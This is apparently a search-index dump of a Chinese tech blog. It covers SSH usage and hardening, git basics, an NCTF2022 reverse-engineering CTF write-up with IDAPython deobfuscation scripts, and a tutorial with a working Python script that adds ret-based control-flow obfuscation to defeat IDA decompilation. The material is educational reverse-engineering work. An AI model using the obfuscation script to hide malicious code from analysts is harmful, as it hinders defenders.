be established. ED25519 key fingerprint is SHA256:xxxxxxxxxxxxxxxxxxxx. This key is not known by any other names. Are you sure you want to continue connecting (yes/no/[fingerprint])? 此时可使用如下命令计算SHA256： \u003e ssh-keyscan -t ed25519 ip | ssh-keygen -lf - # ip:22 SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1 256 SHA256:xxxxxxxxxxxxx ip (ED25519) 上下两个SHA256一致，则可证明确实在与服务器通信 ","date":"2022-12-23","objectID":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/:2:6","tags":["executable","ssh"],"title":"可执行文件概述和ssh使用简介","uri":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/"},{"categories":["Dev"],"content":"#一些有用的配置 客户端设置主机别名 每次进行ssh登录都要输入ssh user@ip -p port未免有点麻烦，可以通过配置～/.ssh/config简化命令写法，配置语法如下： Host my_vps User user Hostname ip Port port 之后就可以使用ssh my_vps代替先前的命令 服务端安全配置 修改/etc/ssh/sshd_config文件，保存修改并重启sshd服务sudo systemctl restart sshd 修改服务端口防止爆破 人人都知道ssh默认端口为22且必有一个叫root的用户 禁止root登录 PermitRootLogin no 禁止密码登录（只能用公钥登录） PasswordAuthentication no ","date":"2022-12-23","objectID":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/:2:7","tags":["executable","ssh"],"title":"可执行文件概述和ssh使用简介","uri":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/"},{"categories":["Binary"],"content":"写在前面 想法来自NCTF2022 ccccha题目 感谢Cynosure师傅愿意跟我分享出题脚本 ","date":"2022-12-14","objectID":"/2022/12/%E5%88%A9%E7%94%A8%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8Cret%E8%B7%B3%E8%BD%AC%E7%9A%84%E7%AE%80%E5%8D%95%E6%8E%A7%E5%88%B6%E6%B5%81%E6%B7%B7%E6%B7%86/:1:0","tags":["reverse","obfuscation"],"title":"ret跳转的简单控制流混淆","uri":"/2022/12/%E5%88%A9%E7%94%A8%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8Cret%E8%B7%B3%E8%BD%AC%E7%9A%84%E7%AE%80%E5%8D%95%E6%8E%A7%E5%88%B6%E6%B5%81%E6%B7%B7%E6%B7%86/"},{"categories":["Binary"],"content":"混淆的目的 想要达到混淆的目的，我们首先要明白： 混淆是对抗静态分析的有效手段，经过混淆的程序仍可正常运行 经过控制流混淆，如IDA等逆向工具将无法正确生成伪代码，给逆向工程带来极大困难 ","date":"2022-12-14","objectID":"/2022/12/%E5%88%A9%E7%94%A8%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8Cret%E8%B7%B3%E8%BD%AC%E7%9A%84%E7%AE%80%E5%8D%95%E6%8E%A7%E5%88%B6%E6%B5%81%E6%B7%B7%E6%B7%86/:2:0","tags":["reverse","obfuscation"],"title":"ret跳转的简单控制流混淆","uri":"/2022/12/%E5%88%A9%E7%94%A8%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8Cret%E8%B7%B3%E8%BD%AC%E7%9A%84%E7%AE%80%E5%8D%95%E6%8E%A7%E5%88%B6%E6%B5%81%E6%B7%B7%E6%B7%86/"},{"categories":["Binary"],"content":"混淆的原理 要想让IDA无法识别控制流，我们就不能使用常规的jmp系列跳转，这里采用修改返回地址+ret跳转的方式，相关汇编代码如下： push rbx pushfq call $+5 pop rbx add rbx, 3Fh mov [rsp+8], rbx popfq retn call $+5是原地call，但同时会将下一条指令（即pop rbx）的地址压入栈，正常时作为调用结束时的返回地址。但下一句pop rbx直接将其取出放入rbx，紧接着对rbx加上一个值，然后覆盖rsp+16。后面两句两个pop，每次rsp+8，正好让原先rsp+16处的值位于栈顶。此时执行retn，就会跳转到栈顶的这个地址。整个过程用gdb调试一下会看得更清楚。 对于ccccha这道题，可参考笔者的上一篇WriteUp，详细地介绍了混淆的原理以及去除方法 ","date":"2022-12-14","objectID":"/2022/12/%E5%88%A9%E7%94%A8%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8Cret%E8%B7%B3%E8%BD%AC%E7%9A%84%E7%AE%80%E5%8D%95%E6%8E%A7%E5%88%B6%E6%B5%81%E6%B7%B7%E6%B7%86/:3:0","tags":["reverse","obfuscation"],"title":"ret跳转的简单控制流混淆","uri":"/2022/12/%E5%88%A9%E7%94%A8%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8Cret%E8%B7%B3%E8%BD%AC%E7%9A%84%E7%AE%80%E5%8D%95%E6%8E%A7%E5%88%B6%E6%B5%81%E6%B7%B7%E6%B7%86/"},{"categories":["Binary"],"content":"添加混淆的过程 整体的思路是： 将用c写好的源代码先编译成汇编 用python脚本在汇编中添加混淆指令 编译汇编文件生成可执行文件 这里笔者首先用C语言写了一个简单的异或加密逻辑： #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e int main() { // char flag[] = \"flag{an_example_of_control_flow_obfuscation}\"; unsigned char key = 0x99; unsigned char enc[] = {255, 245, 248, 254, 226, 248, 247, 198, 252, 225, 248, 244, 233, 245, 252, 198, 246, 255, 198, 250, 246, 247, 237, 235, 246, 245, 198, 255, 245, 246, 238, 198, 246, 251, 255, 236, 234, 250, 248, 237, 240, 246, 247, 228}; unsigned char input[50]; scanf(\"%44s\", input); for(int i = 0; i \u003c 44; i++) { input[i] ^= key; if (input[i]!= enc[i]) { puts(\"wrong\"); exit(-1); } } puts(\"right\"); return 0; } 然后通过gcc -S main.c -o main.s即可得到汇编文件 下面重点说一下python脚本的内容： ","date":"2022-12-14","objectID":"/2022/12/%E5%88%A9%E7%94%A8%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8Cret%E8%B7%B3%E8%BD%AC%E7%9A%84%E7%AE%80%E5%8D%95%E6%8E%A7%E5%88%B6%E6%B5%81%E6%B7%B7%E6%B7%86/:4:0","tags":["reverse","obfuscation"],"title":"ret跳转的简单控制流混淆","uri":"/2022/12/%E5%88%A9%E7%94%A8%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8Cret%E8%B7%B3%E8%BD%AC%E7%9A%84%E7%AE%80%E5%8D%95%E6%8E%A7%E5%88%B6%E6%B5%81%E6%B7%B7%E6%B7%86/"},{"categories":["Binary"],"content":"在每一句指令后添加jmp跳转 # 读入汇编文件 with open(\"main.s\", \"r\") as input: codes = input.read() codes = codes.split('\\n') #print(len(codes)) # 添加jmp指令 res = \"\" cnt = 1 for line in codes: if line == \"\": # 空行直接略过 continue elif line[-1] == ':' or line[0] == '.' or line[1] == '.': # 非代码行原样不动 res += '\\t' + line.strip() + '\\n' else: res += '\\t' + line.strip() res += \"\\n\\tjmp .ML{}\\n\".format(cnt) # 添加jmp跳转 res += \".ML{}:\\n\".format(cnt) # 添加跳转目标标签 cnt += 1 with open(\"jmp.s\", \"w\") as output: # 写入jmp.s文件 output.write(res) 此时我们可以编译jmp.s得到可执行文件，确定可以正常运行 拖到IDA里，通过CFG可以清晰地看出，代码确实被切分成了一个个小部分 但是仍然可以正常反编译得到伪代码，且与不添加jmp指令几乎无差别，这说明了IDA可以轻易处理jmp这种显式跳转。 ","date":"2022-12-14","objectID":"/2022/12/%E5%88%A9%E7%94%A8%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8Cret%E8%B7%B3%E8%BD%AC%E7%9A%84%E7%AE%80%E5%8D%95%E6%8E%A7%E5%88%B6%E6%B5%81%E6%B7%B7%E6%B7%86/:4:1","tags":["reverse","obfuscation"],"title":"ret跳转的简单控制流混淆","uri":"/2022/12/%E5%88%A9%E7%94%A8%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8Cret%E8%B7%B3%E8%BD%AC%E7%9A%84%E7%AE%80%E5%8D%95%E6%8E%A7%E5%88%B6%E6%B5%81%E6%B7%B7%E6%B7%86/"},{"categories":["Binary"],"content":"将jmp跳转替换为ret跳转 # 把jmp跳转替换为ret跳转 codes = res.split('\\n') res_2 = \"\" jmp_count = 0 target_count = 1 for line in codes: if \"jmp .ML\" not in line: # 非跳转指令原样不动 res_2 += line + '\\n' else: res_2 += f''' pushq %rbx pushfq .byte 0xe8 .byte 0x00 .byte 0x00 .byte 0x00 .byte 0x00 .CALL_LAB_{jmp_count}: popq %rbx addq $(.ML{target_count} - .CALL_LAB_{jmp_count}),%rbx movq %rbx, 8(%rsp) popfq ret ''' jmp_count += 1 target_count += 1 with open(\"junk.s\", \"w\") as output: output.write(res_2) 通过将jmp跳转替换，跳转效果不变，编译后运行可执行程序功能正常 但此时再使用IDA打开，会发现已经无法正常反编译，代码块都是破碎的、找不到联系的，也无法进行静态分析 ","date":"2022-12-14","objectID":"/2022/12/%E5%88%A9%E7%94%A8%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8Cret%E8%B7%B3%E8%BD%AC%E7%9A%84%E7%AE%80%E5%8D%95%E6%8E%A7%E5%88%B6%E6%B5%81%E6%B7%B7%E6%B7%86/:4:2","tags":["reverse","obfuscation"],"title":"ret跳转的简单控制流混淆","uri":"/2022/12/%E5%88%A9%E7%94%A8%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8Cret%E8%B7%B3%E8%BD%AC%E7%9A%84%E7%AE%80%E5%8D%95%E6%8E%A7%E5%88%B6%E6%B5%81%E6%B7%B7%E6%B7%86/"},{"categories":["Binary"],"content":"More… 如ccccha这道题中一样，你可以向其中添加更多的花指令使问题变得更复杂，且混淆更不容易去除 ","date":"2022-12-14","objectID":"/2022/12/%E5%88%A9%E7%94%A8%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8Cret%E8%B7%B3%E8%BD%AC%E7%9A%84%E7%AE%80%E5%8D%95%E6%8E%A7%E5%88%B6%E6%B5%81%E6%B7%B7%E6%B7%86/:4:3","tags":["reverse","obfuscation"],"title":"ret跳转的简单控制流混淆","uri":"/2022/12/%E5%88%A9%E7%94%A8%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8Cret%E8%B7%B3%E8%BD%AC%E7%9A%84%E7%AE%80%E5%8D%95%E6%8E%A7%E5%88%B6%E6%B5%81%E6%B7%B7%E6%B7%86/"},{"categories":["WriteUps"],"content":"ccccha 题目地址：https://github.com/X1cT34m/NCTF2022 这道题重点在去花/混淆，去完之后是个chacha20就不说了 花指令大致可分为三类： ","date":"2022-12-10","objectID":"/2022/12/nctf2022-ccccha-wp/:1:0","tags":["CTF","reverse"],"title":"NCTF2022 ccccha 花指令/混淆 详解","uri":"/2022/12/nctf2022-ccccha-wp/"},{"categories":["WriteUps"],"content":"1. push完啥也没干就pop push rax push rbx push rdx pop rdx pop rbx pop rax 解决方案：全都nop掉，脚本如下： start = 0x1090 end = 0xB000 def nop(start_addr, len): patch_bytes(start_addr, b'\\x90' * len) for i in range(start, end): if get_bytes(i, 4) == b'SRZ[': nop(i, 4) if get_bytes(i, 6) == b'PSRZ[X': nop(i, 6) if get_bytes(i, 2) == b'RZ': nop(i, 2) if get_bytes(i, 4) == b'PRZX': nop(i, 4) if get_bytes(i, 2) == b'PX': nop(i, 2) if get_bytes(i, 2) == b'S[': nop(i, 2) if get_bytes(i, 4) == b'PS[X': nop(i, 4) if get_bytes(i, 4) == b'RPXZ': nop(i, 4) ","date":"2022-12-10","objectID":"/2022/12/nctf2022-ccccha-wp/:1:1","tags":["CTF","reverse"],"title":"NCTF2022 ccccha 花指令/混淆 详解","uri":"/2022/12/nctf2022-ccccha-wp/"},{"categories":["WriteUps"],"content":"2. 经典0xe8 pushfq push rax cmp rax, 2022h ja short near ptr loc_1311+2 jle short near ptr loc_1311+2 call near ptr 489D6BFEh 解决方案：从pushfq到两个0xe8全部nop掉，以及两个0xe8后面是pop rax和popfq，也一块扬了，脚本如下： start = 0x1090 end = 0xB000 def nop(start_addr, len): patch_bytes(start_addr, b'\\x90' * len) for i in range(start, end): if get_bytes(i, 16) == b'\\x9cPH=\" \\x00\\x00w\\x04~\\x02\\xe8\\xe8X\\x9d': nop(i, 16) ","date":"2022-12-10","objectID":"/2022/12/nctf2022-ccccha-wp/:1:2","tags":["CTF","reverse"],"title":"NCTF2022 ccccha 花指令/混淆 详解","uri":"/2022/12/nctf2022-ccccha-wp/"},{"categories":["WriteUps"],"content":"3. 修改函数返回地址并利用retn跳转 push rbx push rbx pushfq call $+5 pop rbx add rbx, 3Fh mov [rsp+16], rbx popfq pop rbx retn call $+5是原地call，但同时会将下一条指令（即pop rbx）的地址压入栈，正常时作为调用结束时的返回地址。但下一句pop rbx直接将其取出放入rbx，紧接着对rbx加上一个值，然后覆盖rsp+16。后面两句两个pop，每次rsp+8，正好让原先rsp+16处的值位于栈顶。此时执行retn，就会跳转到栈顶的这个地址。整个过程用gdb调试一下会看得更清楚。 正是这种奇怪的跳转方式让IDA无法识别目标地址，形成了控制流混淆，也就无法F5。想要修复这个控制流，我们需要把这种隐式的跳转变成显式的jmp跳转，即可让IDA更好地分析 接下来难题就变成了如何构造jmp指令，这里需要我们对汇编和机器码有一个更深的理解，下面举例说明： 48 81 C3 3F 00 00 00是add rbx, 3Fh的机器码，其中前三字节48 81 C3表示add rbx，后四字节3F 00 00 00是所加的立即数3Fh 48 83 C3 82是add rbx, 0FFFFFFFFFFFFFF82h的机器码，可见当操作数为负数时，add的机器码由81变为83，同时参数值变成了低一字节 jmp命令的机器码有三种 EB 8位offset：短跳转（short jump）跳转到256字节的范围内 E9 16/32位offset：近跳转（near jump）可跳转到同一个段内的任意地址 EA ptr 16:16/32：远跳转（far jump）可跳转到程序中任意地址 此处我们选择E9，并且参数为32位offset（相对EIP的偏移） patch脚本： start = 0x1090 end = 0xB000 for i in range(start, end): # 第一种add if get_bytes(i, 12) == b'SS\\x9c\\xe8\\x00\\x00\\x00\\x00[H\\x81\\xc3' and get_bytes(i+16, 8) == b'H\\x89\\\\$\\x10\\x9d[\\xc3': offset = int.from_bytes(get_bytes(i+12, 4), 'little') + 3 # +3 是由于patch后jmp的下一条指令地址与原来call的下一条指令地址相差3 patch_bytes(i, b'\\xe9' + offset.to_bytes(4, 'little') + b'\\x90' * 19) # 第二种add if get_bytes(i, 12) == b'SS\\x9c\\xe8\\x00\\x00\\x00\\x00[H\\x83\\xc3' and get_bytes(i+13, 8) == b'H\\x89\\\\$\\x10\\x9d[\\xc3': offset = (int.from_bytes(get_bytes(i+12, 1), 'little') | 0xffffff00) + 3 patch_bytes(i, b'\\xe9' + offset.to_bytes(4, 'little') + b'\\x90' * 16) patch完成之后ida仍无法显示不对劲，此时需要patch program apply一下，然后重新打开IDA加载程序，即可正确反编译出伪代码，如下： __int64 __fastcall sub_8DED() { __int64 v0; // rbp int i; // [rsp+10h] [rbp-140h] _DWORD v3[44]; // [rsp+18h] [rbp-138h] BYREF __int64 v4; // [rsp+CBh] [rbp-85h] BYREF int v5; // [rsp+D3h] [rbp-7Dh] char v6; // [rsp+D7h] [rbp-79h] _QWORD v7[4]; // [rsp+D8h] [rbp-78h] BYREF char v8; // [rsp+F8h] [rbp-58h] _QWORD v9[5]; // [rsp+108h] [rbp-48h] BYREF __int16 v10; // [rsp+130h] [rbp-20h] unsigned __int64 v11; // [rsp+140h] [rbp-10h] __int64 v12; // [rsp+148h] [rbp-8h] v12 = v0; v11 = __readfsqword(0x28u); v7[0] = 0x6A05A2805023EE57LL; v7[1] = 0x12CFEBEC73124005LL; v7[2] = 0xF060C3D29ED918C4LL; v7[3] = 0x45613036DB175B72LL; v4 = 0x143D83BD8A1337E6LL; v5 = -1868846699; v9[0] = 0x23CE4B73757CC05ELL; v9[1] = 0x708F01F3AC89BBA4LL; v9[2] = 0x62D45B4183317FC8LL; v9[3] = 0x4B50FC9DDC27A7A6LL; v9[4] = 0x385117386B2F9806LL; v10 = -4305; v8 = 0; v6 = 0; puts(\"input:\"); sub_8941(); if ( strlen(s1) != 42 ) { printf(\"Wrong!\"); exit(0); } sub_1090(v3, v7, \u0026v4, 0x9E3779B9); sub_1F33(v3); for ( i = 0; i \u003c= 41; ++i ) { s1[i] ^= *((_BYTE *)v3 + i); s1[i] += i; } if ( !memcmp(s1, v9, 0x2AuLL) ) printf(\"Right!\"); else printf(\"Wrong!\"); return 0LL; } void __fastcall sub_1090(_DWORD *a1, _DWORD *a2, _DWORD *a3, int a4) { memcpy(a1 + 16, a2, 0x20uLL); memcpy(a1 + 24, a3, 0xCuLL); qmemcpy(a1 + 28, \"expand 32-byte k\", 16); a1[32] = *a2; a1[33] = a2[1]; a1[34] = a2[2]; a1[35] = a2[3]; a1[36] = a2[4]; a1[37] = a2[5]; a1[38] = a2[6]; a1[39] = a2[7]; a1[40] = a4; a1[41] = *a3; a1[42] = a3[1]; a1[43] = a3[2]; } void __fastcall sub_1F33(_DWORD *a1) { int i; // [rsp+24h] [rbp-1Ch] int j; // [rsp+28h] [rbp-18h] int k; // [rsp+2Ch] [rbp-14h] for ( i = 0; i \u003c= 15; ++i ) a1[i] = a1[i + 28]; for ( j = 0; j \u003c= 9; ++j ) { printf(\" \\b\"); *a1 += a1[4]; a1[12] = __ROL4__(a1[12] ^ *a1, 16); a1[8] += a1[12]; a1[4] = __ROL4__(a1[4] ^ a1[8], 12); *a1 += a1[4]; a1[12] = __ROL4__(a1[12] ^ *a1, 8); a1[8] += a1[12]; a1[4] = __ROL4__(a1[4] ^ a1[8], 7); a1[1] += a1[5]; a1[13] = __ROL4__(a1[13] ^ a1[1], 16); a1[9] += a1[13]; a1[5] = __ROL4__(a1[5] ^ a1[9], 12); a1[1] += a1[5]; a1[13] = __ROL4__(a1[13] ^ a1[1], 8); a1[9] += a1[13]; a1[5] = __ROL4__(a1[5] ^ a1[9], 7); a1[2] += a1[6]; a1[14] = __ROL4__(a1[14] ^ a1[2], 16); a1[10] += a1[14]; a1[6] = __ROL4__(a1[6] ^ a1[10], 12); a1[2] += a1[6]; a1[14] = __ROL4__(a1[14] ^ a1[2], 8); a1[10] += a1[14]; a1[6] = __ROL4__(a1[6] ^ a1[10], 7); a1[3] += a1[7]; a1[15] = __ROL4__(a1[15] ^ a1[3], 16); a1[11] += a1[15]; a1[7] = __ROL4__(a1[7] ^ a1[11], 12); a1[3] += a1[7]; a1[15] = __ROL4__(a1[15] ","date":"2022-12-10","objectID":"/2022/12/nctf2022-ccccha-wp/:1:3","tags":["CTF","reverse"],"title":"NCTF2022 ccccha 花指令/混淆 详解","uri":"/2022/12/nctf2022-ccccha-wp/"},{"categories":["Binary"],"content":"pyc文件简析 ","date":"2022-12-05","objectID":"/2022/12/python%E5%AD%97%E8%8A%82%E7%A0%81%E8%8A%B1%E6%8C%87%E4%BB%A4/:1:0","tags":["python","reverse"],"title":"[TODO]pyc、字节码与花指令","uri":"/2022/12/python%E5%AD%97%E8%8A%82%E7%A0%81%E8%8A%B1%E6%8C%87%E4%BB%A4/"},{"categories":["Binary"],"content":"pyc是什么？ 当我们在代码中import另外的python文件时，就会生成一个相应的pyc文件（python3会将其放在__pycache__文件夹中），这是 python code object的持久化储存方式，能够加速下一次的装载，提高运行效率。 ","date":"2022-12-05","objectID":"/2022/12/python%E5%AD%97%E8%8A%82%E7%A0%81%E8%8A%B1%E6%8C%87%E4%BB%A4/:1:1","tags":["python","reverse"],"title":"[TODO]pyc、字节码与花指令","uri":"/2022/12/python%E5%AD%97%E8%8A%82%E7%A0%81%E8%8A%B1%E6%8C%87%E4%BB%A4/"},{"categories":["Binary"],"content":"Rreference https://bbs.pediy.com/thread-270901.htm#msg_header_h1_1 ","date":"2022-12-05","objectID":"/2022/12/windows-r3%E5%B8%B8%E8%A7%81hook%E6%80%BB%E7%BB%93/:1:0","tags":["windows","reverse"],"title":"[TODO]windows R3 常见hook方式","uri":"/2022/12/windows-r3%E5%B8%B8%E8%A7%81hook%E6%80%BB%E7%BB%93/"},{"categories":["Dev"],"content":"版本控制（git） ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:0:0","tags":["git"],"title":"版本控制（git）","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"为什么需要版本控制 方便管理不同功能的多个版本 方便出问题后回滚 方便多人协作 ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:1:0","tags":["git"],"title":"版本控制（git）","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"git数据模型 ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:2:0","tags":["git"],"title":"版本控制（git）","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"#要存什么？ 目录结构（tree） 文件详细内容（blob对象/数据对象） 各个版本/提交的历史记录（snap快照） 历史记录关联/先后顺序（有向无环图） o \u003c-- o \u003c-- o \u003c-- o \u003c---- o ^ / \\ v --- o \u003c-- o ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:2:1","tags":["git"],"title":"版本控制（git）","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"#伪代码表示 // 文件就是一组数据 type blob = array\u003cbyte\u003e // 一个包含文件和目录的目录 type tree = map\u003cstring, tree | blob\u003e // 每个提交都包含一个父辈，元数据和顶层树 type commit = struct { parent: array\u003ccommit\u003e // 父节点 author: string // 作者 message: string // 提交信息 snapshot: tree // 目录结构 } ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:2:2","tags":["git"],"title":"版本控制（git）","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"#对象和内存寻址 在git中blob、tree、commit都是object（对象） git在存储数据时，所有的对象都会基于他们的SHA1散列值（通常为40位16进制值）进行寻址，由此任意一个提交都会被一串字符串唯一标识 ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:2:3","tags":["git"],"title":"版本控制（git）","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"#一些特殊的引用 SHA1运算的结果40位16进制数难以记忆，所以为了更加方便的获取一些对象的地址，git对一些哈希赋予了人类可读的名字，叫做对象的引用，常见的引用有： HEAD：指向当前工作区所在的分支/提交 master/main：仓库主分支 origin：远程仓库 ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:2:4","tags":["git"],"title":"版本控制（git）","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"明确git和github的关系 git 不依赖于 github 存在。 github可以作为一个远程git仓库，进行代码托管，方便多人协作 ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:3:0","tags":["git"],"title":"版本控制（git）","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"git本地基本工作流 ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:4:0","tags":["git"],"title":"版本控制（git）","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"#三个区域 本地目录（工作区） 打开文件夹实际看到的 暂存区（索引区） 在文件被提交至本地仓库之前所处的位置 本地仓库（.git文件夹） 存储着各种历史版本 ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:4:1","tags":["git"],"title":"版本控制（git）","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"#操作流程 初始化git仓库 git init 新建/修改/删除文件 vim/rm/... git status：查看git仓库状态 把文件添加到暂存区 git add 为什么需要暂存区？ 您开发了两个独立的特性，然后您希望创建两个独立的提交，其中第一个提交仅包含第一个特性，而第二个提交仅包含第二个特性。 简单来说就是可以自由地控制提交的内容，使用更灵活 将暂存区中的文件提交到本地仓库 git commit git log：查看commit信息 etc… ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:4:2","tags":["git"],"title":"版本控制（git）","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"git branch（分支） ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:5:0","tags":["git"],"title":"版本控制（git）","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"#为什么需要分支？ 隔离开发主线，确认无误后再进行分支合并 分离不同功能，使版本管理更有条理 多人协作更方便 ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:5:1","tags":["git"],"title":"版本控制（git）","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"#命令行操作 详细请看git help branch，这里仅进行简单罗列 git branch -v：查看现有分支 git branch ：创建分支 git checkout ：切换分支 git merge ：合并分支 ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:5:2","tags":["git"],"title":"版本控制（git）","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"git remote（远程仓库） 将代码保存在远程仓库，方便多人协作，方便他人拉取代码 ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:6:0","tags":["git"],"title":"版本控制（git）","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"#明确 git remote仓库与 本地仓库 是完全一样的结构，一样有commit/branch等概念 注意如果在本地创建了新分支，远程仓库也需要创建新分支（一般是push同时创建新分支） ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:6:1","tags":["git"],"title":"版本控制（git）","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"#命令行操作 git remote -v：查看远程仓库信息 git remote add ：添加一个远程仓库 git remote rm ：删除一个远程仓库 git clone ：克隆一个远程仓库到本地 git push :：向远程仓库推送代码 git fetch ：从远程仓库拉取代码 git pull = git fetch + git merge ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:6:2","tags":["git"],"title":"版本控制（git）","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"git常见场景 ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:7:0","tags":["git"],"title":"版本控制（git）","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"#本地初始化仓库提交到github git init初始化git仓库 注意添加.gitignore文件忽略隐私文件、多余文件 git add、git commit… git push 到远程仓库 ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:7:1","tags":["git"],"title":"版本控制（git）","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"#clone远程仓库并在本地编辑 复制远程仓库url 本地进行git clone 进行开发 push到远程仓库 ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:7:2","tags":["git"],"title":"版本控制（git）","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"#fork仓库并发起pr(pull request) 本地拉取github仓库 创建新分支，在新分支上进行开发 push到github仓库 提交pr, 等待原仓库管理员合并 ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:7:3","tags":["git"],"title":"版本控制（git）","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"tips ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:8:0","tags":["git"],"title":"版本控制（git）","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"#撤销commit 未push到remote git reset –soft 把commit撤销到暂存区 git reset –mixed 把commit撤销到工作区（同时撤销git commit和git add） 已push到remote git reset –hard 